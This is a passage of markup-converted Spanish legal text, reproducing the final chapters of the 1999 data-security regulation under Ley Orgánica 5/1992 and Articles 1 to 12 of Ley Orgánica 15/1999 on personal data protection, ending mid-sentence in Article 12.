<!--l. 580--><para> CAP&#x00CD;TULO V
</para><!--l. 581--><para>Infracciones y sanciones</para></section>
<!--l. 584--><para>Art&#x02CA;&#x0131;culo 27. Infracciones y sanciones.

</para><!--l. 586--><para>  1. El incumplimiento de las medidas de seguridad descritas en el presente Reglamento ser&#x00E1; sancionado de
acuerdo con lo establecido en los art&#x02CA;&#x0131;culos 43 y 44 de la Ley Org&#x00E1;nica 5/1992, cuando se trate de &#xFB01;cheros de
titularidad privada.
<!--br/-->El procedimiento a seguir para la imposici&#x00F3;n de la sanci&#x00F3;n a la que se re&#xFB01;ere el p&#x00E1;rrafo anterior ser&#x00E1; el
establecido en el Real Decreto 1332/1994, de 20 de junio, por el que se desarrollan determinados aspectos
de la Ley Org&#x00E1;nica 5/1992, de 29 de octubre, de Regulaci&#x00F3;n del Tratamiento Automatizado de los Datos de
Car&#x00E1;cter Personal.
<!--br/-->
</para><!--l. 596--><para>  2. Cuando se trate de &#xFB01;cheros de los que sean responsables las Administraciones P&#x00FA;blicas se estar&#x00E1;, en
cuanto al procedimiento y a las sanciones, a lo dispuesto en el art&#x02CA;&#x0131;culo 45 de la Ley Org&#x00E1;nica 5/1992.
<!--br/-->Art&#x02CA;&#x0131;culo 28. Responsables.
</para><!--l. 602--><para>  Los responsables del &#xFB01;chero, sujetos al r&#x00E9;gimen sancionador de la Ley Org&#x00E1;nica 5/1992, deber&#x00E1;n adoptar las
medidas de &#x02CA;&#x0131;ndole t&#x00E9;cnica y organizativas necesarias que garanticen la seguridad de los datos de car&#x00E1;cter
personal en los t&#x00E9;rminos establecidos en el presente Reglamento.
</para><section role="center"><title/>
<!--l. 606--><para> CAP&#x00CD;TULO VI
</para><!--l. 607--><para>Competencias del Director de la Agencia de Protecci&#x00F3;n de Datos</para></section>
<!--l. 611--><para>Art&#x02CA;&#x0131;culo 29. Competencias del Director de la Agencia de Protecci&#x00F3;n de Datos.
</para><!--l. 614--><para>  El Director de la Agencia de Protecci&#x00F3;n de Datos podr&#x00E1;, de conformidad con lo establecido en el art&#x02CA;&#x0131;culo
36 de la Ley Org&#x00E1;nica 5/1992:
     </para><itemizedlist>
     <listitem>
     <!--l. 617--><para>Dictar, en su caso y sin perjuicio de las competencias de otros &#x00F3;rganos, las instrucciones precisas
     para adecuar los tratamientos automatizados a los principios de la Ley Org&#x00E1;nica 5/1992.
     </para></listitem>
     <listitem>
     <!--l. 620--><para>Ordenar la cesaci&#x00F3;n de los tratamientos de datos de car&#x00E1;cter personal y la cancelaci&#x00F3;n de los
     &#xFB01;cheros cuando no se cumplan las medidas de seguridad previstas en el presente Reglamento.</para></listitem></itemizedlist>
<!--l. 625--><para>Disposici&#x00F3;n transitoria &#x00FA;nica. Plazos de implantaci&#x00F3;n de las medidas.
</para><!--l. 628--><para>  En el caso de sistemas de informaci&#x00F3;n que se encuentren en funcionamiento a la entrada en vigor del
presente Reglamento, las medidas de seguridad de nivel b&#x00E1;sico previstas en el presente Reglamento deber&#x00E1;n
implantarse en el plazo de seis meses desde su entrada en vigor, las de nivel medio en el plazo de un a~no y
las de nivel alto en el plazo de dos a~nos.
<!--br/-->
<!--br/-->Cuando los sistemas de informaci&#x00F3;n que se encuentren en funcionamiento no permitan tecnol&#x00F3;gicamente la
implantaci&#x00F3;n de alguna de las medidas de seguridad previstas en el presente Reglamento, la adecuaci&#x00F3;n de
dichos sistemas y la implantaci&#x00F3;n de las medidas de seguridad deber&#x00E1;n realizarse en el plazo m&#x00E1;ximo de tres
a~nos a contar desde la entrada en vigor del presente Reglamento.


  </para></section><!--end section--><!--l. 640--><section 
role="section"><title><abbrev role="title-mark">B.3</abbrev><anchor 
   id="x1-355000B.3"  ></anchor>Ley Org&#x00E1;nica de Protecci&#x00F3;n de Datos</title>
<!--l. 641--><para>  <anchor 
   id="x1-355001f0"  ></anchor><footnote><para>   Ley Org&#x00E1;nica 15/1999, de 13 de diciembre, de Protecci&#x00F3;n de Datos de Car&#x00E1;cter Personal.</para></footnote>
</para><section role="center"><title/>
<!--l. 642--><para> T&#x00CD;TULO I
</para><!--l. 644--><para>Disposiciones generales</para></section>
<!--l. 646--><para>Art&#x02CA;&#x0131;culo 1. Objeto.
</para><!--l. 648--><para>  La presente Ley Org&#x00E1;nica tiene por objeto garantizar y proteger, en lo que concierne al tratamiento de los
datos personales, las libertades p&#x00FA;blicas y los derechos fundamentales de las personas f&#x02CA;&#x0131;sicas, y
especialmente de su honor e intimidad personal y familiar.
<!--br/-->Art&#x02CA;&#x0131;culo 2. &#x00C1;mbito de aplicaci&#x00F3;n.
</para><!--l. 655--><para>  1. La presente Ley Org&#x00E1;nica ser&#x00E1; de aplicaci&#x00F3;n a los datos de car&#x00E1;cter personal registrados en soporte f&#x02CA;&#x0131;sico
que los haga susceptibles de tratamiento, y a toda modalidad de uso posterior de estos datos por los
sectores p&#x00FA;blico y privado.
<!--br/-->Se regir&#x00E1; por la presente Ley Org&#x00E1;nica todo tratamiento de datos de car&#x00E1;cter personal: &#x00A0;
</para><!--l. 662--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 663--><para>Cuando el tratamiento sea efectuado en territorio espa~nol en el marco de las actividades de
     un establecimiento del responsable del tratamiento.
     </para></listitem>
     <listitem>
     <!--l. 666--><para>Cuando al responsable del tratamiento no establecido en territorio espa~nol, le sea de aplicaci&#x00F3;n
     la legislaci&#x00F3;n espa~nola en aplicaci&#x00F3;n de normas de Derecho Internacional p&#x00FA;blico.
     </para></listitem>
     <listitem>
     <!--l. 669--><para>Cuando el responsable del tratamiento no est&#x00E9; establecido en territorio de la Uni&#x00F3;n Europea y
     utilice en el tratamiento de datos medios situados en territorio espa~nol, salvo que tales medios
     se utilicen &#x00FA;nicamente con &#xFB01;nes de tr&#x00E1;nsito.</para></listitem></itemizedlist>
<!--l. 675--><para>  2. El r&#x00E9;gimen de protecci&#x00F3;n de los datos de car&#x00E1;cter personal que se establece en la presente Ley Org&#x00E1;nica no
ser&#x00E1; de aplicaci&#x00F3;n:
     </para><itemizedlist>
     <listitem>
     <!--l. 678--><para>A los &#xFB01;cheros mantenidos por personas f&#x02CA;&#x0131;sicas en el ejercicio de actividades exclusivamente
     personales o dom&#x00E9;sticas.
     </para></listitem>
     <listitem>
     <!--l. 680--><para>A los &#xFB01;cheros sometidos a la normativa sobre protecci&#x00F3;n de materias clasi&#xFB01;cadas.
     </para></listitem>
     <listitem>
     <!--l. 682--><para>A  los  &#xFB01;cheros  establecidos  para  la  investigaci&#x00F3;n  del  terrorismo  y  de  formas  graves  de
     delincuencia organizada. No obstante, en estos supuestos el responsable del &#xFB01;chero comunicar&#x00E1;
     previamente la existencia del mismo, sus caracter&#x02CA;&#x0131;sticas generales y su &#xFB01;nalidad a la Agencia
     de Protecci&#x00F3;n de Datos.</para></listitem></itemizedlist>
<!--l. 689--><para>  3. Se regir&#x00E1;n por sus disposiciones espec&#x02CA;&#x0131;&#xFB01;cas, y por lo especialmente previsto, en su caso, por esta Ley
Org&#x00E1;nica los siguientes tratamientos de datos personales:

     </para><itemizedlist>
     <listitem>
     <!--l. 693--><para>Los &#xFB01;cheros regulados por la legislaci&#x00F3;n de r&#x00E9;gimen electoral.
     </para></listitem>
     <listitem>
     <!--l. 694--><para>Los que sirvan a &#xFB01;nes exclusivamente estad&#x02CA;&#x0131;sticos, y est&#x00E9;n amparados por la legislaci&#x00F3;n estatal
     o auton&#x00F3;mica sobre la funci&#x00F3;n estad&#x02CA;&#x0131;stica p&#x00FA;blica.
     </para></listitem>
     <listitem>
     <!--l. 697--><para>Los  que  tengan  por  objeto  el  almacenamiento  de  los  datos  contenidos  en  los  informes
     personales de cali&#xFB01;caci&#x00F3;n a que se re&#xFB01;ere la legislaci&#x00F3;n del R&#x00E9;gimen del personal de las Fuerzas
     Armadas.
     </para></listitem>
     <listitem>
     <!--l. 700--><para>Los derivados del Registro Civil y del Registro Central de penados y rebeldes.
     </para></listitem>
     <listitem>
     <!--l. 702--><para>Los procedentes de im&#x00E1;genes y sonidos obtenidos mediante la utilizaci&#x00F3;n de videoc&#x00E1;maras por las
     Fuerzas y Cuerpos de Seguridad, de conformidad con la legislaci&#x00F3;n sobre la materia.</para></listitem></itemizedlist>
<!--l. 707--><para>Art&#x02CA;&#x0131;culo 3. De&#xFB01;niciones.
</para><!--l. 709--><para>  A los efectos de la presente Ley Org&#x00E1;nica se entender&#x00E1; por:
     </para><itemizedlist>
     <listitem>
     <!--l. 711--><para>Datos de car&#x00E1;cter personal: Cualquier informaci&#x00F3;n concerniente a personas f&#x02CA;&#x0131;sicas identi&#xFB01;cadas
     o identi&#xFB01;cables.
     </para></listitem>
     <listitem>
     <!--l. 713--><para>Fichero: Todo conjunto organizado de datos de car&#x00E1;cter personal, cualquiera que fuere la forma
     o modalidad de su creaci&#x00F3;n, almacenamiento, organizaci&#x00F3;n y acceso.
     </para></listitem>
     <listitem>
     <!--l. 716--><para>Tratamiento de datos: Operaciones y procedimientos t&#x00E9;cnicos de car&#x00E1;cter automatizado o no,
     que permitan la recogida, grabaci&#x00F3;n, conservaci&#x00F3;n, elaboraci&#x00F3;n, modi&#xFB01;caci&#x00F3;n, bloqueo y cancelaci&#x00F3;n,
     as&#x02CA;&#x0131; como las cesiones de datos que resulten de comunicaciones, consultas, interconexiones y
     transferencias.
     </para></listitem>
     <listitem>
     <!--l. 721--><para>Responsable del &#xFB01;chero o tratamiento: Persona f&#x02CA;&#x0131;sica o jur&#x02CA;&#x0131;dica, de naturaleza p&#x00FA;blica o privada,
     u &#x00F3;rgano administrativo, que decida sobre la &#xFB01;nalidad, contenido y uso del tratamiento.
     </para></listitem>
     <listitem>
     <!--l. 724--><para>Afectado o interesado: Persona f&#x02CA;&#x0131;sica titular de los datos que sean objeto del tratamiento a
     que se re&#xFB01;ere el apartado c) del presente art&#x02CA;&#x0131;culo.
     </para></listitem>
     <listitem>
     <!--l. 727--><para>Procedimiento de disociaci&#x00F3;n: Todo tratamiento de datos personales de modo que la informaci&#x00F3;n
     que se obtenga no pueda asociarse a persona identi&#xFB01;cada o identi&#xFB01;cable.

     </para></listitem>
     <listitem>
     <!--l. 730--><para>Encargado del tratamiento: La persona f&#x02CA;&#x0131;sica o jur&#x02CA;&#x0131;dica, autoridad p&#x00FA;blica, servicio o cualquier
     otro organismo que, solo o conjuntamente con otros, trate datos personales por cuenta del
     responsable del tratamiento.
     </para></listitem>
     <listitem>
     <!--l. 734--><para>Consentimiento del interesado: Toda manifestaci&#x00F3;n de voluntad, libre, inequ&#x02CA;&#x0131;voca, espec&#x02CA;&#x0131;&#xFB01;ca e
     informada, mediante la que el interesado consienta el tratamiento de datos personales que le
     conciernen.
     </para></listitem>
     <listitem>
     <!--l. 737--><para>Cesi&#x00F3;n o comunicaci&#x00F3;n de datos: Toda revelaci&#x00F3;n de datos realizada a una persona distinta del
     interesado.
     </para></listitem>
     <listitem>
     <!--l. 739--><para>Fuentes accesibles al p&#x00FA;blico: Aquellos &#xFB01;cheros cuya consulta puede ser realizada por cualquier
     persona, no impedida por una norma limitativa, o sin m&#x00E1;s exigencia que, en su caso, el abono
     de una contraprestaci&#x00F3;n. Tienen la consideraci&#x00F3;n de fuentes de acceso p&#x00FA;blico, exclusivamente,
     el censo promocional, los repertorios telef&#x00F3;nicos en los t&#x00E9;rminos previstos por su normativa
     espec&#x02CA;&#x0131;&#xFB01;ca y las listas de personas pertenecientes a grupos de profesionales que contengan
     &#x00FA;nicamente los datos de nombre, t&#x02CA;&#x0131;tulo, profesi&#x00F3;n, actividad, grado acad&#x00E9;mico, direcci&#x00F3;n e indicaci&#x00F3;n
     de su pertenencia al grupo. Asimismo, tienen el car&#x00E1;cter de fuentes de acceso p&#x00FA;blico, los Diarios
     y Boletines o&#xFB01;ciales y los medios de comunicaci&#x00F3;n.</para></listitem></itemizedlist>
<!--l. 751--><para>
</para><section role="center"><title/>
<!--l. 751--><para> T&#x00CD;TULO II
</para><!--l. 753--><para>Principios de la protecci&#x00F3;n de datos</para></section>
<!--l. 755--><para>Art&#x02CA;&#x0131;culo 4. Calidad de los datos.
</para><!--l. 757--><para>  1. Los datos de car&#x00E1;cter personal s&#x00F3;lo se podr&#x00E1;n recoger para su tratamiento, as&#x02CA;&#x0131; como someterlos a dicho
tratamiento, cuando sean adecuados, pertinentes y no excesivos en relaci&#x00F3;n con el &#x00E1;mbito y las &#xFB01;nalidades
determinadas, expl&#x02CA;&#x0131;citas y leg&#x02CA;&#x0131;timas para las que se hayan obtenido.
<!--br/-->
</para><!--l. 763--><para>  2. Los datos de car&#x00E1;cter personal objeto de tratamiento no podr&#x00E1;n usarse para &#xFB01;nalidades incompatibles
con aquellas para las que los datos hubieran sido recogidos. No se considerar&#x00E1; incompatible el tratamiento
posterior de &#x00E9;stos con &#xFB01;nes hist&#x00F3;ricos, estad&#x02CA;&#x0131;sticos o cient&#x02CA;&#x0131;&#xFB01;cos.
<!--br/-->
</para><!--l. 769--><para>  3. Los datos de car&#x00E1;cter personal ser&#x00E1;n exactos y puestos al d&#x02CA;&#x0131;a de forma que respondan con veracidad a la
situaci&#x00F3;n actual del afectado.
<!--br/-->
</para><!--l. 772--><para>  4. Si los datos de car&#x00E1;cter personal registrados resultaran ser inexactos, en todo o en parte, o
incompletos, ser&#x00E1;n cancelados y sustituidos de o&#xFB01;cio por los correspondientes datos recti&#xFB01;cados o
completados, sin perjuicio de las facultades que a los afectados reconoce el art&#x02CA;&#x0131;culo 16.
<!--br/-->
</para><!--l. 777--><para>  5. Los datos de car&#x00E1;cter personal ser&#x00E1;n cancelados cuando hayan dejado de ser necesarios o pertinentes
para la &#xFB01;nalidad para la cual hubieran sido recabados o registrados.
<!--br/-->No ser&#x00E1;n conservados en forma que permita la identi&#xFB01;caci&#x00F3;n del interesado durante un per&#x02CA;&#x0131;odo superior al
necesario para los &#xFB01;nes en base a los cuales hubieran sido recabados o registrados.
<!--br/-->Reglamentariamente se determinar&#x00E1; el procedimiento por el que, por excepci&#x00F3;n, atendidos los valores
hist&#x00F3;ricos, estad&#x02CA;&#x0131;sticos o cient&#x02CA;&#x0131;&#xFB01;cos de acuerdo con la legislaci&#x00F3;n espec&#x02CA;&#x0131;&#xFB01;ca, se decida el mantenimiento
&#x02CA;&#x0131;ntegro de determinados datos.
<!--br/-->

</para><!--l. 788--><para>  6. Los datos de car&#x00E1;cter personal ser&#x00E1;n almacenados de forma que permitan el ejercicio del derecho de
acceso, salvo que sean legalmente cancelados.
<!--br/-->
</para><!--l. 792--><para>  7. Se proh&#x02CA;&#x0131;be la recogida de datos por medios fraudulentos, desleales o il&#x02CA;&#x0131;citos.
<!--br/-->Art&#x02CA;&#x0131;culo 5. Derecho de informaci&#x00F3;n en la recogida de datos.
</para><!--l. 798--><para>  1. Los interesados a los que se soliciten datos personales deber&#x00E1;n ser previamente informados de modo
expreso, preciso e inequ&#x02CA;&#x0131;voco:
     </para><itemizedlist>
     <listitem>
     <!--l. 801--><para>De la existencia de un &#xFB01;chero o tratamiento de datos de car&#x00E1;cter personal, de la &#xFB01;nalidad de
     la recogida de &#x00E9;stos y de los destinatarios de la informaci&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 804--><para>Del car&#x00E1;cter obligatorio o facultativo de su respuesta a las preguntas que les sean planteadas.
     </para></listitem>
     <listitem>
     <!--l. 806--><para>De las consecuencias de la obtenci&#x00F3;n de los datos o de la negativa a suministrarlos.
     </para></listitem>
     <listitem>
     <!--l. 808--><para>De la posibilidad de ejercitar los derechos de acceso, recti&#xFB01;caci&#x00F3;n, cancelaci&#x00F3;n y oposici&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 810--><para>De la identidad y direcci&#x00F3;n del responsable del tratamiento o, en su caso, de su representante.</para></listitem></itemizedlist>
<!--l. 813--><para>Cuando el responsable del tratamiento no est&#x00E9; establecido en el territorio de la Uni&#x00F3;n Europea y utilice en el
tratamiento de datos medios situados en territorio espa~nol, deber&#x00E1; designar, salvo que tales medios se
utilicen con &#xFB01;nes de tr&#x00E1;nsito, un representante en Espa~na, sin perjuicio de las acciones que pudieran
emprenderse contra el propio responsable del tratamiento.
<!--br/-->
</para><!--l. 820--><para>  2. Cuando se utilicen cuestionarios u otros impresos para la recogida, &#xFB01;gurar&#x00E1;n en los mismos, en forma
claramente legible, las advertencias a que se re&#xFB01;ere el apartado anterior.
<!--br/-->
</para><!--l. 824--><para>  3. No ser&#x00E1; necesaria la informaci&#x00F3;n a que se re&#xFB01;eren las letras b), c) y d) del apartado 1 si el contenido de
ella se deduce claramente de la naturaleza de los datos personales que se solicitan o de las circunstancias
en que se recaban.
<!--br/-->
</para><!--l. 829--><para>  4. Cuando los datos de car&#x00E1;cter personal no hayan sido recabados del interesado, &#x00E9;ste deber&#x00E1; ser informado
de forma expresa, precisa e inequ&#x02CA;&#x0131;voca, por el responsable del &#xFB01;chero o su representante, dentro de los tres
meses siguientes al momento del registro de los datos, salvo que ya hubiera sido informado con
anterioridad, del contenido del tratamiento, de la procedencia de los datos, as&#x02CA;&#x0131; como de lo previsto en las
letras a), d) y e) del apartado 1 del presente art&#x02CA;&#x0131;culo.
<!--br/-->
</para><!--l. 837--><para>  5. No ser&#x00E1; de aplicaci&#x00F3;n lo dispuesto en el apartado anterior cuando expresamente una Ley lo prevea,
cuando el tratamiento tenga &#xFB01;nes hist&#x00F3;ricos, estad&#x02CA;&#x0131;sticos o cient&#x02CA;&#x0131;&#xFB01;cos, o cuando la informaci&#x00F3;n al interesado
resulte imposible o exija esfuerzos desproporcionados, a criterio de la Agencia de Protecci&#x00F3;n de Datos o del
organismo auton&#x00F3;mico equivalente, en consideraci&#x00F3;n al n&#x00FA;mero de interesados, a la antig&#x00A8;uedad de los datos y
a las posibles medidas compensatorias.
<!--br/-->Asimismo, tampoco regir&#x00E1; lo dispuesto en el apartado anterior cuando los datos procedan de fuentes
accesibles al p&#x00FA;blico y se destinen a la actividad de publicidad o prospecci&#x00F3;n comercial, en cuyo
caso, en cada comunicaci&#x00F3;n que se dirija al interesado se le informar&#x00E1; del origen de los datos
y de la identidad del responsable del tratamiento as&#x02CA;&#x0131; como de los derechos que le asisten.

<!--br/-->Art&#x02CA;&#x0131;culo 6. Consentimiento del afectado.
</para><!--l. 853--><para>  1. El tratamiento de los datos de car&#x00E1;cter personal requerir&#x00E1; el consentimiento inequ&#x02CA;&#x0131;voco del afectado,
salvo que la Ley disponga otra cosa.
<!--br/-->
</para><!--l. 857--><para>  2. No ser&#x00E1; preciso el consentimiento cuando los datos de car&#x00E1;cter personal se recojan para el ejercicio de
las funciones propias de las Administraciones P&#x00FA;blicas en el &#x00E1;mbito de sus competencias; cuando se re&#xFB01;eran a
las partes de un contrato o precontrato de una relaci&#x00F3;n negocial, laboral o administrativa y sean necesarios
para su mantenimiento o cumplimiento; cuando el tratamiento de los datos tenga por &#xFB01;nalidad proteger un
inter&#x00E9;s vital del interesado en los t&#x00E9;rminos del art&#x02CA;&#x0131;culo 7, apartado 6 de la presente Ley, o cuando los
datos &#xFB01;guren en fuentes accesibles al p&#x00FA;blico y su tratamiento sea necesario para la satisfacci&#x00F3;n
del inter&#x00E9;s leg&#x02CA;&#x0131;timo perseguido por el responsable del &#xFB01;chero o por el del tercero a quien se
comuniquen los datos, siempre que no se vulneren los derechos y libertades fundamentales del
interesado.
<!--br/-->
</para><!--l. 870--><para>  3. El consentimiento a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo podr&#x00E1; ser revocado cuando exista causa justi&#xFB01;cada para
ello y no se le atribuyan efectos retroactivos.
<!--br/-->
</para><!--l. 874--><para>  4. En los casos en los que no sea necesario el consentimiento del afectado para el tratamiento de los
datos de car&#x00E1;cter personal, y siempre que una Ley no disponga lo contrario, &#x00E9;ste podr&#x00E1; oponerse a su
tratamiento cuando existan motivos fundados y leg&#x02CA;&#x0131;timos relativos a una concreta situaci&#x00F3;n personal. En tal
supuesto, el responsable del &#xFB01;chero excluir&#x00E1; del tratamiento los datos relativos al afectado.
<!--br/-->Art&#x02CA;&#x0131;culo 7. Datos especialmente protegidos.
</para><!--l. 883--><para>  1. De acuerdo con lo establecido en el apartado 2 del art&#x02CA;&#x0131;culo 16 de la Constituci&#x00F3;n, nadie podr&#x00E1; ser
obligado a declarar sobre su ideolog&#x02CA;&#x0131;a, religi&#x00F3;n o creencias.
<!--br/-->Cuando en relaci&#x00F3;n con estos datos se proceda a recabar el consentimiento a que se re&#xFB01;ere el apartado
siguiente, se advertir&#x00E1; al interesado acerca de su derecho a no prestarlo.
<!--br/-->
</para><!--l. 890--><para>  2. S&#x00F3;lo con el consentimiento expreso y por escrito del afectado podr&#x00E1;n ser objeto de tratamiento los datos
de car&#x00E1;cter personal que revelen la ideolog&#x02CA;&#x0131;a, a&#xFB01;liaci&#x00F3;n sindical, religi&#x00F3;n y creencias. Se except&#x00FA;an los
&#xFB01;cheros mantenidos por los partidos pol&#x02CA;&#x0131;ticos, sindicatos, iglesias, confesiones o comunidades
religiosas y asociaciones, fundaciones y otras entidades sin &#x00E1;nimo de lucro, cuya &#xFB01;nalidad sea
pol&#x02CA;&#x0131;tica, &#xFB01;los&#x00F3;&#xFB01;ca, religiosa o sindical, en cuanto a los datos relativos a sus asociados o miembros,
sin perjuicio de que la cesi&#x00F3;n de dichos datos precisar&#x00E1; siempre el previo consentimiento del
afectado.
<!--br/-->
</para><!--l. 900--><para>  3. Los datos de car&#x00E1;cter personal que hagan referencia al origen racial, a la salud y a la vida sexual s&#x00F3;lo
podr&#x00E1;n ser recabados, tratados y cedidos cuando, por razones de inter&#x00E9;s general, as&#x02CA;&#x0131; lo disponga una Ley o el
afectado consienta expresamente.
<!--br/-->
</para><!--l. 905--><para>  4. Quedan prohibidos los &#xFB01;cheros creados con la &#xFB01;nalidad exclusiva de almacenar datos de car&#x00E1;cter
personal que revelen la ideolog&#x02CA;&#x0131;a, a&#xFB01;liaci&#x00F3;n sindical, religi&#x00F3;n, creencias, origen racial o &#x00E9;tnico, o vida
sexual.
<!--br/-->
</para><!--l. 910--><para>  5. Los datos de car&#x00E1;cter personal relativos a la comisi&#x00F3;n de infracciones penales o administrativas s&#x00F3;lo
podr&#x00E1;n ser incluidos en &#xFB01;cheros de las Administraciones P&#x00FA;blicas competentes en los supuestos previstos en
las respectivas normas reguladoras.
<!--br/-->
</para><!--l. 915--><para>  6. No obstante lo dispuesto en los apartados anteriores podr&#x00E1;n ser objeto de tratamiento los datos de
car&#x00E1;cter personal a que se re&#xFB01;eren los apartados 2 y 3 de este art&#x02CA;&#x0131;culo, cuando dicho tratamiento resulte
necesario para la prevenci&#x00F3;n o para el diagn&#x00F3;stico m&#x00E9;dicos, la prestaci&#x00F3;n de asistencia sanitaria o tratamientos
m&#x00E9;dicos o la gesti&#x00F3;n de servicios sanitarios, siempre que dicho tratamiento de datos se realice por un
profesional sanitario sujeto al secreto profesional o por otra persona sujeta asimismo a una obligaci&#x00F3;n
equivalente de secreto.
<!--br/-->Tambi&#x00E9;n podr&#x00E1;n ser objeto de tratamiento los datos a que se re&#xFB01;ere el p&#x00E1;rrafo anterior cuando el
tratamiento sea necesario para salvaguardar el inter&#x00E9;s vital del afectado o de otra persona, en el

supuesto de que el afectado est&#x00E9; f&#x02CA;&#x0131;sica o jur&#x02CA;&#x0131;dicamente incapacitado para dar su consentimiento.
<!--br/-->Art&#x02CA;&#x0131;culo 8. Datos relativos a la salud.
</para><!--l. 931--><para>  Sin perjuicio de lo que se dispone en el art&#x02CA;&#x0131;culo 11 respecto de la cesi&#x00F3;n, las instituciones y los centros
sanitarios p&#x00FA;blicos y privados y los profesionales correspondientes podr&#x00E1;n proceder al tratamiento de los
datos de car&#x00E1;cter personal relativos a la salud de las personas que a ellos acudan o hayan de ser tratados en
los mismos, de acuerdo con lo dispuesto en la legislaci&#x00F3;n estatal o auton&#x00F3;mica sobre sanidad.
<!--br/-->Art&#x02CA;&#x0131;culo 9. Seguridad de los datos.
</para><!--l. 940--><para>  1. El responsable del &#xFB01;chero, y, en su caso, el encargado del tratamiento, deber&#x00E1;n adoptar las medidas de
&#x02CA;&#x0131;ndole t&#x00E9;cnica y organizativas necesarias que garanticen la seguridad de los datos de car&#x00E1;cter personal y
eviten su alteraci&#x00F3;n, p&#x00E9;rdida, tratamiento o acceso no autorizado, habida cuenta del estado de la tecnolog&#x02CA;&#x0131;a,
la naturaleza de los datos almacenados y los riesgos a que est&#x00E1;n expuestos, ya provengan de la acci&#x00F3;n
humana o del medio f&#x02CA;&#x0131;sico o natural.
<!--br/-->
</para><!--l. 948--><para>  2. No se registrar&#x00E1;n datos de car&#x00E1;cter personal en &#xFB01;cheros que no re&#x00FA;nan las condiciones que se determinen
por v&#x02CA;&#x0131;a reglamentaria con respecto a su integridad y seguridad y a las de los centros de tratamiento,
locales, equipos, sistemas y programas.
<!--br/-->
</para><!--l. 953--><para>  3. Reglamentariamente se establecer&#x00E1;n los requisitos y condiciones que deban reunir los &#xFB01;cheros y las
personas que intervengan en el tratamiento de los datos a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 7 de esta Ley.
<!--br/-->Art&#x02CA;&#x0131;culo 10. Deber de secreto.
</para><!--l. 959--><para>  El responsable del &#xFB01;chero y quienes intervengan en cualquier fase del tratamiento de los datos de car&#x00E1;cter
personal est&#x00E1;n obligados al secreto profesional respecto de los mismos y al deber de guardarlos, obligaciones
que subsistir&#x00E1;n aun despu&#x00E9;s de &#xFB01;nalizar sus relaciones con el titular del &#xFB01;chero o, en su caso, con el
responsable del mismo.
<!--br/-->
<!--br/-->Art&#x02CA;&#x0131;culo 11. Comunicaci&#x00F3;n de datos.
</para><!--l. 967--><para>  1. Los datos de car&#x00E1;cter personal objeto del tratamiento s&#x00F3;lo podr&#x00E1;n ser comunicados a un tercero para el
cumplimiento de &#xFB01;nes directamente relacionados con las funciones leg&#x02CA;&#x0131;timas del cedente y del cesionario
con el previo consentimiento del interesado.
<!--br/-->
</para><!--l. 972--><para>  2. El consentimiento exigido en el apartado anterior no ser&#x00E1; preciso:
     </para><itemizedlist>
     <listitem>
     <!--l. 974--><para>Cuando la cesi&#x00F3;n est&#x00E1; autorizada en una Ley.
     </para></listitem>
     <listitem>
     <!--l. 975--><para>Cuando se trate de datos recogidos de fuentes accesibles al p&#x00FA;blico.
     </para></listitem>
     <listitem>
     <!--l. 977--><para>Cuando el tratamiento responda a la libre y leg&#x02CA;&#x0131;tima aceptaci&#x00F3;n de una relaci&#x00F3;n jur&#x02CA;&#x0131;dica cuyo
     desarrollo, cumplimiento y control implique necesariamente la conexi&#x00F3;n de dicho tratamiento
     con &#xFB01;cheros de terceros. En este caso la comunicaci&#x00F3;n s&#x00F3;lo ser&#x00E1; leg&#x02CA;&#x0131;tima en cuanto se limite a la
     &#xFB01;nalidad que la justi&#xFB01;que.
     </para></listitem>
     <listitem>
     <!--l. 982--><para>Cuando la comunicaci&#x00F3;n que deba efectuarse tenga por destinatario al Defensor del Pueblo,
     el Ministerio Fiscal o los Jueces o Tribunales o el Tribunal de Cuentas, en el ejercicio de las

     funciones que tiene atribuidas. Tampoco ser&#x00E1; preciso el consentimiento cuando la comunicaci&#x00F3;n
     tenga como destinatario a instituciones auton&#x00F3;micas con funciones an&#x00E1;logas al Defensor del
     Pueblo o al Tribunal de Cuentas.
     </para></listitem>
     <listitem>
     <!--l. 988--><para>Cuando la cesi&#x00F3;n se produzca entre Administraciones P&#x00FA;blicas y tenga por objeto el tratamiento
     posterior de los datos con &#xFB01;nes hist&#x00F3;ricos, estad&#x02CA;&#x0131;sticos o cient&#x02CA;&#x0131;&#xFB01;cos.
     </para></listitem>
     <listitem>
     <!--l. 991--><para>Cuando la cesi&#x00F3;n de datos de car&#x00E1;cter personal relativos a la salud sea necesaria para solucionar
     una urgencia que requiera acceder a un &#xFB01;chero o para realizar los estudios epidemiol&#x00F3;gicos en
     los t&#x00E9;rminos establecidos en la legislaci&#x00F3;n sobre sanidad estatal o auton&#x00F3;mica.</para></listitem></itemizedlist>
<!--l. 997--><para>  3. Ser&#x00E1; nulo el consentimiento para la comunicaci&#x00F3;n de los datos de car&#x00E1;cter personal a un tercero cuando la
informaci&#x00F3;n que se facilite al interesado no le permita conocer la &#xFB01;nalidad a que destinar&#x00E1;n
los datos cuya comunicaci&#x00F3;n se autoriza o el tipo de actividad de aqu&#x00E9;l a quien se pretenden
comunicar.
<!--br/-->
</para><!--l. 1003--><para>  4. El consentimiento para la comunicaci&#x00F3;n de los datos de car&#x00E1;cter personal tiene tambi&#x00E9;n un car&#x00E1;cter de
revocable.
<!--br/-->
</para><!--l. 1006--><para>  5. Aqu&#x00E9;l a quien se comuniquen los datos de car&#x00E1;cter personal se obliga, por el solo hecho de la
comunicaci&#x00F3;n, a la observancia de las disposiciones de la presente Ley.
<!--br/-->
</para><!--l. 1010--><para>  6. Si la comunicaci&#x00F3;n se efect&#x00FA;a previo procedimiento de disociaci&#x00F3;n, no ser&#x00E1; aplicable lo establecido en los
apartados anteriores.
<!--br/-->Art&#x02CA;&#x0131;culo 12. Acceso a los datos por cuenta de terceros.
</para><!--l. 1015--><para>  1. No se considerar&#x00E1; comunicaci&#x00F3;n de datos el acceso de un tercero a los datos cuando dicho acceso sea
necesario para la prestaci&#x00F3;n de un servicio al responsable del tratamiento.
<!--br/-->
</para><!--l. 1019--><para>  2. La realizaci&#x00F3;n de tratamientos por cuenta de terceros deber&#x00E1; estar regulada en un contrato
que deber&#x00E1; constar por escrito o en alguna otra forma que permita acreditar su celebraci&#x00F3;n y
contenido, estableci&#x00E9;ndose expresamente que el encargado del tratamiento &#x00FA;nicamente tratar&#x00E1; los datos
